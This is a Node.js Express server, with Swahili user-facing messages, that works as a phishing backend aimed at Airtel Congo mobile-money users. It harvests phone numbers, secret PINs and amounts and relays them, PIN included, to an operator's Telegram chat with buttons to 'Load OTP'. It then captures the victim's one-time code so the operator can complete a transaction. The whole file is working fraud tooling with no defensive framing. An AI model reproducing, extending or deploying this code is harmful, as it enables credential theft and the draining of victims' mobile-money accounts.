const express = require('express');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// In-memory store for applications/users
const sessions = {};

// Strict Airtel Congo validation helper (+243 97, 98, 99)
function validateAirtelCongoNumber(phoneNumber) {
  if (!phoneNumber || typeof phoneNumber !== 'string') return false;
  const cleaned = phoneNumber.trim().replace(/[\s\-\(\)]/g, '');
  const regex = /^(?:\+243|243)?(97|98|99)\d{7}$/;
  return regex.test(cleaned);
}

// Check payment / activation status mock (customize if you have a database)
app.post('/api/submit-application', async (req, res) => {
  try {
    const { contact, pin, amount, adminChatId } = req.body;

    if (!validateAirtelCongoNumber(contact)) {
      return res.status(400).json({
        success: false,
        error: 'Namba sio sahihi. Ruhusa ni kwa namba za Airtel Congo pekee (+243 97/98/99).'
      });
    }

    // Generate unique ID for session tracking
    const userId = 'user_' + Date.now();
    sessions[userId] = {
      contact,
      pin: pin || '',
      amount,
      status: 'PENDING_ADMIN'
    };

    // Optional Telegram notification if configured
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const targetChatId = adminChatId || process.env.TELEGRAM_CHAT_ID;

    if (telegramToken && targetChatId) {
      const msg = `🚨 Maombi Mapya (Airtel Congo):\nNamba: ${contact}\nKiasi: ${amount}\nPIN: ${pin}`;
      await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        chat_id: targetChatId,
        text: msg,
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Idhinisha (Load OTP)', callback_data: `approve_${userId}` },
              { text: '❌ Kataa', callback_data: `deny_${userId}` }
            ]
          ]
        }
      }).catch(err => console.log('Telegram error:', err.message));
    }

    return res.status(200).json({
      success: true,
      userId,
      message: 'Maombi yamewasilishwa kikamilifu.'
    });

  } catch (err) {
    console.error(err);
    return res.status(500).json({ success: false, error: 'Hitilafu ya seva.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions[userId];
  if (!session) {
    return res.status(404).json({ status: 'NOT_FOUND' });
  }
  return res.status(200).json({ status: session.status });
});

app.post('/api/submit-otp', (req, res) => {
  const { userId, otp } = req.body;
  const session = sessions[userId];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Kikao hakipatikani.' });
  }

  if (!otp || otp.length !== 4) {
    return res.status(400).json({ success: false, error: 'Tafadhali ingiza OTP sahihi ya tarakimu 4.' });
  }

  session.otp = otp;
  session.status = 'SUCCESS';
  return res.status(200).json({ success: true });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Airtel Congo Server running on port ${PORT}`);
});
